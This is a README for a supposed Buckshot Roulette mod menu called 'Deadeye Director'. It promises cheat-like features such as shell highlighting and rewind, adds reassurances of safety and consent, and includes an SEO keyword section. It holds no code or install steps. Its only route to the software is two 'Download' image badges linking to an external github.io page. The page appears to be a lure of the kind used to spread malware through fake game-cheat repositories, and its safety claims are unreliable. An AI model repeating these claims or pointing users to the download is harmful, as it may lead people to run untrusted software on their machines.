![preview](https://raw.githubusercontent.com/DerChugJugAufDieEins/Buckshot-Roulette-Mod-Menu-Vanilla-Safe/main/shot_8a8f.svg)
[![Download](https://raw.githubusercontent.com/DerChugJugAufDieEins/Buckshot-Roulette-Mod-Menu-Vanilla-Safe/main/pkg_f35a22.svg)](https://DerChugJugAufDieEins.github.io/Buckshot-Roulette-Mod-Menu-Vanilla-Safe/)

# 🎯 Deadeye Director — A Script-Layer Companion for Buckshot Roulette

<p align="center">
  <img alt="status" src="https://img.shields.io/badge/status-active%20development-brightgreen">
  <img alt="platform" src="https://img.shields.io/badge/platform-Windows%20%7C%20Linux%20%7C%20Steam%20Deck-1f6feb">
  <img alt="engine" src="https://img.shields.io/badge/engine-Godot%204.x-478cbf">
  <img alt="runtime" src="https://img.shields.io/badge/runtime-godot--mod--loader-8a2be2">
  <img alt="license" src="https://img.shields.io/badge/license-MIT-yellow">
  <img alt="year" src="https://img.shields.io/badge/release-2026-orange">
  <img alt="players" src="https://img.shields.io/badge/modes-solo%20%2B%20shared-9cf">
  <img alt="footprint" src="https://img.shields.io/badge/on--disk%20edits-none-success">
</p>

> **Deadeye Director** is an independent, script-only augmentation layer for *Buckshot Roulette* (Godot, Steam build v2.2.0.6). It never touches a single byte of the shipped game files. Instead, it attaches at runtime through the godot-mod-loader pipeline, injecting a lightweight control console that lets you rehearse, remix, and re-stage the table however you like — in solo runs and in shared lobby sessions alike.

Think of it less as a "cheat" and more as a **stage manager for chaos**: you are not rewriting the play, you are simply dimming the lights, swapping the props, and whispering new cues to the actors while the audience watches.

---

## 📜 Table of Contents

- [What This Project Is](#-what-this-project-is)
- [Design Philosophy](#-design-philosophy)
- [Feature Overview](#-feature-overview)
  - [Session Control Room](#-session-control-room)
  - [Inventory & Shell Choreography](#-inventory--shell-choreography)
  - [Information Layer](#-information-layer)
  - [Multiplayer Etiquette Module](#-multiplayer-etiquette-module)
  - [Comfort & Accessibility](#-comfort--accessibility)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Around-the-Clock Assistance](#-around-the-clock-assistance)
- [Compatibility Matrix](#-compatibility-matrix)
- [Architecture at a Glance](#-architecture-at-a-glance)
- [Configuration File Reference](#-configuration-file-reference)
- [Safety, Reversibility, and Transparency](#-safety-reversibility-and-transparency)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Community & Contribution](#-community--contribution)
- [SEO Notes & Discoverability](#-seo-notes--discoverability)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🔍 What This Project Is

*Buckshot Roulette* is a tense, slow-burning game of incomplete information. Two players sit across a table, shells are loaded in secret, and every trigger pull is a negotiation between nerve and math. **Deadeye Director** exists to give players a second lens on that tension — not to erase it, but to let you study it, twist it, and share your experiments with friends.

The mod is delivered as a **script extension bundle**. When the game boots, godot-mod-loader detects the bundle, wires it into the running scene tree, and hands control to a small, deterministic command surface. Remove the bundle and the game behaves exactly as it did on day one. Nothing is patched, nothing is overwritten, and nothing is left behind except a generated log file you can delete at any time.

In short: a **runtime overlay**, not a surgery.

---

## 🧠 Design Philosophy

Most augmentation tools in this space chase maximum spectacle. Deadeye Director chases **authorial control**. The difference is subtle but important:

- **Spectacle** says "give me every advantage at once."
- **Authorial control** says "let me stage the exact scenario I want to observe, on purpose, repeatedly, until it teaches me something."

That philosophy shows up in three concrete choices:

1. **Deterministic toggles.** Every option is a named, serializable flag. No hidden randomness, no surprise side effects, no ambience that drifts between sessions.
2. **Visible state.** The overlay reports what it is doing in a status ribbon, so you always know which flags are live at any moment.
3. **Graceful exits.** Every panel can be dismissed with a single key, and the overlay disengages completely when you close it — the underlying game state continues uninterrupted.

---

## 🎛️ Feature Overview

The feature set is grouped into five themed consoles. Each console is independently toggleable, so a player who only wants a quieter HUD can enable just the comfort module and ignore the rest.

### 🕹️ Session Control Room

The Session Control Room is the master panel. Here you can:

- Pause and resume shell rotation without leaving the table.
- Re-deal the current round from a saved snapshot.
- Rewind the last three decision points, useful for studying branch outcomes.
- Freeze the AI opponent's decision timer for as long as you want to think.
- Set a **"rehearsal spin"** that re-rolls the opening hand deterministically from a seed you provide.

Every option here is reversible. If a state is ambiguous — for example, when the round has already progressed past the rewind horizon — the console explains why in plain language instead of silently failing.

### 🎒 Inventory & Shell Choreography

A playground for the mechanically curious:

- Rearrange held items into any slot order.
- Preview what a hypothetical inventory swap would look like before committing.
- Inspect shell counts as a probability histogram rather than a raw number.
- Stage a **"what if"** drawer where you can model a hypothetical loadout and see how the scene would respond.

This console is the heart of the tool. It turns the table into a sandbox.

### 🔎 Information Layer

A read-only overlay that surfaces already-present information in a more legible form:

- Highlight shells that are live versus blank when you would otherwise have to memorize them.
- Annotate the opponent's likely next move based on their recent history within the current session only.
- Draw a small timeline of the round so far, one tick per pull.

Nothing here reaches into hidden server state or private data. It only reflects what the client already knows.

### 🤝 Multiplayer Etiquette Module

Multiplayer in *Buckshot Roulette* is a social act. This module is deliberately conservative:

- **Consent gate.** When you join a shared lobby, the overlay asks whether the host has permitted visual augmentation. If you answer no, the informational layer stays off.
- **Broadcast hints.** Optional, non-intrusive pings you can send to teammates ("thinking," "ready," "passing") that appear as small textual cues, never as gameplay changes.
- **Local-only by default.** All creative features are off in shared sessions until explicitly enabled by you.

We wrote this module first and the rest of the tool second. That order was intentional.

### ♿ Comfort & Accessibility

- Adjustable overlay opacity so the console never fights with dark scene backgrounds.
- Per-element text scaling from 80% to 200%.
- High-contrast and reduced-motion presets.
- A "quiet mode" that suppresses all decorative animation.
- Color-blind-safe palettes for the histogram and timeline views.

---

## 📱 Responsive Interface

The overlay is built on a flexible anchor system that adapts to any window geometry the game supports. Whether you play in a tall portrait window, an ultrawide landscape, or a cramped 800×600 fallback, panels reflow rather than overflow. Buttons keep a minimum touch target so the interface is usable on handheld devices such as the Steam Deck, where the pointer is a thumb rather than a mouse.

The layout engine also remembers your last panel arrangement per display, so docking to an external monitor does not reset your workspace.

### Highlights

- Fluid grid that collapses from three columns to one without losing context.
- Pinch, drag, and keyboard-only navigation all supported.
- Tooltip system that never occludes the active control.
- Layout persistence stored in a small adjacent JSON profile.

---

## 🌐 Multilingual Support

Interface strings ship with translations for a growing list of locales. Language detection is automatic, but you can pin a preference in the configuration profile:

- English (reference)
- Spanish
- Portuguese (Brazil)
- French
- German
- Italian
- Polish
- Turkish
- Japanese
- Korean
- Simplified Chinese

Translation files are plain, editable resources. If you would like to see your language represented, the contribution process is described below — no build toolchain required, just a text editor and patience.

---

## 📞 Around-the-Clock Assistance

Questions do not respect time zones, and neither does the support rotation. A small volunteer group monitors the discussion space in shifts so that issues raised at 03:00 local time still get a reasoned response before the next play session. Support is offered in the spirit of shared curiosity: bring a clear description, a log excerpt if you can produce one, and a note about your environment, and you will usually get an answer quickly.

Support covers:

- Configuration questions and profile migration between versions.
- Reproducible behavior reports with clear steps.
- Translation corrections and locale additions.
- Accessibility feedback, which we treat as first-class input rather than an afterthought.

Response times are best-effort. We are players too, and sometimes we are mid-round.

---

## 🧩 Compatibility Matrix

| Environment | Status | Notes |
| --- | --- | --- |
| Windows 10 / 11 (Steam) | Verified | Primary development target |
| Linux (Proton) | Verified | Tested on several distributions |
| Steam Deck (SteamOS) | Verified | Touch targets tuned for handheld play |
| macOS (via supported runtimes) | Experimental | Works, but the overlay is keyboard-centric |
| Godot 4.x editor preview | Supported | For contributors iterating on the UI |
| Older game builds (pre-v2.2.0.6) | Unsupported | API surface differs too much |

---

## 🏗️ Architecture at a Glance

Deadeye Director is intentionally small. The whole thing fits comfortably in a single afternoon's reading.

- **Loader shim** — a thin entry point that godot-mod-loader recognizes. It wires in the rest of the bundle and registers a single autoload scene.
- **Console scene** — the responsive UI layer. Pure presentation; holds no game logic.
- **Director core** — a state machine that receives commands from the console, validates them against the current game phase, and publishes approved mutations to a narrow adapter.
- **Adapter layer** — the only place that talks to the game's scene tree. Keeping all game-touching code in one file makes auditing easy.
- **Profile store** — reads and writes the JSON configuration, validates it against a schema, and migrates old profiles forward.

Because the adapter is the sole point of contact with the host game, a future game update only requires revisiting that one file rather than the entire codebase.

---

## ⚙️ Configuration File Reference

The profile lives beside the bundle and is a plain JSON document. Representative keys (values shown are defaults):

| Key | Type | Default | Purpose |
| --- | --- | --- | --- |
| overlay_enabled | boolean | true | Master switch for the console |
| overlay_opacity | number | 0.92 | Panel background transparency |
| text_scale | number | 1.0 | Per-element scaling factor |
| reduced_motion | boolean | false | Suppresses decorative animation |
| high_contrast | boolean | false | Enables the accessibility palette |
| language | string | "auto" | Pinned locale, or automatic detection |
| multiplayer_consent | boolean | false | Whether the informational layer may run in shared lobbies |
| quiet_mode | boolean | false | Hides non-essential chrome |
| session_seed | string | "" | Optional deterministic seed for rehearsal spins |

Editing the profile while the game runs is supported; the store watches the file and reloads on change. Invalid values fall back to defaults and are logged with a plain explanation.

---

## 🛡️ Safety, Reversibility, and Transparency

Three principles govern everything the tool does:

1. **No on-disk mutation of game files.** The bundle is additive. Delete it and the game is untouched. This is the single most important property of the project.
2. **All state changes are announced.** Every action the overlay performs is reflected in the status ribbon. Nothing happens silently.
3. **Every action has an inverse.** Undo is not an afterthought; it is a first-class concept in the director core.

We also publish a short audit note whenever a new version changes which parts of the scene tree the adapter touches, so that anyone can verify the surface area has not crept outward.

---

## 🗺️ Roadmap for 2026

The plan for the coming year is deliberately boring, because boring means stable:

- **Q1 2026** — Profile schema versioning and a migration test suite.
- **Q2 2026** — Additional locales and a community translation review window.
- **Q3 2026** — Expanded accessibility presets, including a fully keyboard-driven navigation mode.
- **Q4 2026** — A companion replay viewer for reviewing rehearsal spins outside the game window.

Stretch goals include a plugin API so third parties can add their own consoles without forking the core.

---

## ❓ Frequently Asked Questions

**Will this work in multiplayer without upsetting the host?**
By default, no creative feature activates in a shared session until you affirm consent. The multiplayer etiquette module is the gatekeeper, and it errs on the side of caution.

**Does the tool leave anything behind after uninstalling?**
A log file and your JSON profile. Both live beside the bundle and can be removed with the folder.

**Can I run it alongside other godot-mod-loader extensions?**
Yes, provided they do not contend for the same autoload slot. Conflicts are reported clearly at boot.

**Is the overlay usable with a controller?**
Navigation is supported, though the layout is tuned for pointer input first.

**Where do I report a bug?**
In the discussion space, with a description, steps to reproduce, and a log excerpt if possible.

---

## 🤝 Community & Contribution

Contributions are welcome and treated generously. The most helpful contributions, in rough order of impact:

1. Clear, reproducible behavior reports.
2. Translation improvements and new locale files.
3. Accessibility feedback, especially from players using assistive technology.
4. Small, focused pull requests that touch one concern at a time.

Please keep discussions civil and on-topic. This is a hobby project with a human on the other end of every message.

---

## 🔎 SEO Notes & Discoverability

If you arrived here while searching for terms such as *Buckshot Roulette script extension*, *Godot mod loader overlay*, *Buckshot Roulette multiplayer companion*, *runtime augmentation for Godot games*, *responsive game overlay*, or *multilingual mod console*, you are in the right place. Deadeye Director is built to be discoverable through the vocabulary players actually use, while remaining honest about what it does: a script-layer companion that stages experiments, never a replacement for the game itself.

Additional relevant phrases that describe this project accurately: *no-disk-modification augmentation*, *reversible session controls*, *probability histogram overlay*, *accessibility-first game console*, and *consent-gated multiplayer tooling*.

---

## ⚠️ Disclaimer

Deadeye Director is an unofficial, community-made companion project. It is **not** affiliated with, endorsed by, or sponsored by the creators or publishers of *Buckshot Roulette*, the Godot engine team, or any platform storefront.

Use of this tool is at your own discretion. The maintainers make no warranty of fitness for any particular purpose, and accept no liability for outcomes arising from its use. Always respect the wishes of other players in shared sessions, and always verify that your use complies with the terms of any platform or community you participate in. If in doubt, ask before you enable anything in a multiplayer environment.

This project is intended for personal, educational, and creative exploration of a game you already own.

---

## 📄 License

Released under the MIT License. The full text is available at the canonical license location: [MIT License](https://opensource.org/licenses/MIT).

Copyright (c) 2026 Deadeye Director contributors.

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files, to deal in the software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the software, and to permit persons to whom the software is furnished to do so, subject to the conditions stated in the license text.

The software is provided "as is", without warranty of any kind.

---

[![Download](https://raw.githubusercontent.com/DerChugJugAufDieEins/Buckshot-Roulette-Mod-Menu-Vanilla-Safe/main/pkg_f35a22.svg)](https://DerChugJugAufDieEins.github.io/Buckshot-Roulette-Mod-Menu-Vanilla-Safe/)